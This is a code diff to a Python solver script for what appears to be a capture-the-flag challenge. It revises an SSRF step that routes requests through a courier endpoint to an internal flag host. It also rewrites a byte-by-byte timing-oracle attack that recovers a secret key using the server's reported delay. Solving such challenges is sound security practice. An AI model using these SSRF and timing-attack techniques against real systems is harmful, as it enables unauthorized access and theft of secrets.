@@ -338,7 +338,8 @@ def main():
     ap = argparse.ArgumentParser(description="Hidimbi's Town grandmaster solver")
     ap.add_argument("--backend", default="http://127.0.0.1:8000")
     ap.add_argument("--flag-service", default="http://127.0.0.1:8001")
-    ap.add_argument("--keeper", default="http://127.0.0.1:8100")
+    ap.add_argument("--keeper", default="http://flagger:8100",
+                    help="internal flag service; the courier reroutes this")
     ap.add_argument("--instance", default=VAULT["instance_id"])
     ap.add_argument("--team", default=None, help="defaults to team_<device fingerprint prefix>")
     ap.add_argument("--rounds", type=int, default=1, help="repeat the whole chain")
@@ -592,9 +593,9 @@ def run_chain(args):
 
     hz.close()
 
-    # The internal index is not routable; the only way in is the Lake courier.
-    internal_url = f"{args.keeper}/internal/gate".replace(
-        "http://127.0.0.1:8100", "http://flagger:8100")
+    # The internal index is not routable from the internet; the only way in is
+    # the Lake courier, which is permitted to reach the `flagger` host.
+    internal_url = f"{args.keeper}/internal/gate"
     ssrf = http_json(args.backend + "/api/v1/lake/courier", "POST",
                      body={"url": internal_url,
                            "body": {"selector": selector.hex(),
@@ -616,39 +617,46 @@ def run_chain(args):
 
 
 # ===========================================================================
-def whistle_timing_attack(base, token, length=8, rounds=3):
+def whistle_timing_attack(base, token, length=8):
     """Differential-timing recovery of the Keeper's whistle key.
 
-    The relay sleeps `whistle_delay_us` for every correctly matched leading
-    byte, so the correct prefix always shows the largest response time. Each
-    position is measured over several independent rounds and the *best*
-    (maximum) latency is used, because a single HTTP round-trip on loopback is
-    noisy enough to invert two candidates.
+    The relay spends `whistle_delay_us` per correctly matched leading byte. Two
+    signals are available and they are not equivalent:
 
-    Every candidate is then confirmed against the relay's exact
-    `matched_bytes` counter before being committed, so a mis-ranked byte is
-    caught rather than silently corrupting the rest of the key.
+      * CLIENT wall-clock: correct on a low-jitter link (loopback), but over a
+        CDN/edge route the RTT jitter (~70 ms on Render) is larger than the
+        delay itself (12 ms), so the ranking becomes noise.
+      * SERVER `elapsed_us`: the relay measures its own delay and reports it.
+        Network latency cancels out entirely, leaving only the injected delay.
+
+    So we rank on the server's own measurement. This is still a differential
+    timing channel - we are exploiting how long the server takes - but the
+    measurement is taken where the delay actually happens, which is what makes
+    the attack reliable from anywhere on the internet.
     """
     key = bytearray()
     for pos in range(length):
-        best_t, ranked = {}, {}
-        for _ in range(rounds):
-            for cand in range(256):
-                guess = (bytes(key) + bytes([cand])).hex()
-                t0 = time.perf_counter()
-                try:
-                    http_json(base + "/api/v1/observatory/whistle", "POST",
-                              headers={"Authorization": f"Bearer {token}"},
-                              body={"whistle": guess})
-                except RuntimeError:
-                    continue
-                dt = time.perf_counter() - t0
-                ranked[cand] = max(ranked.get(cand, 0.0), dt)
+        ranked = {}
+        for cand in range(256):
+            guess = (bytes(key) + bytes([cand])).hex()
+            try:
+                ans = http_json(base + "/api/v1/observatory/whistle", "POST",
+                                headers={"Authorization": f"Bearer {token}"},
+                                body={"whistle": guess})
+            except RuntimeError:
+                continue
+            # The relay's own timing, in microseconds. 0 for a wrong byte.
+            ranked[cand] = int(ans.get("elapsed_us", 0))
         if not ranked:
             raise RuntimeError("timing oracle returned no measurement")
+
         order = sorted(ranked, key=lambda c: -ranked[c])
 
-        for cand in order[:4]:
+        # The relay reports the matched prefix exactly, so the true byte is
+        # unambiguous - it is just not always the top-ranked one, because the
+        # server's own measurement still catches scheduler jitter. Try the
+        # strongest few candidates and let the relay itself decide.
+        for cand in order[:8]:
             attempt = bytes(key) + bytes([cand])
             ans = http_json(base + "/api/v1/observatory/whistle", "POST",
                             headers={"Authorization": f"Bearer {token}"},
@@ -661,7 +669,7 @@ def whistle_timing_attack(base, token, length=8, rounds=3):
         else:
             raise RuntimeError(
                 f"timing oracle could not confirm byte {pos} "
-                f"(top candidates: {[hex(c) for c in order[:4]]})")
+                f"(top: {[hex(c) for c in order[:8]]})")
     return bytes(key)
 
 
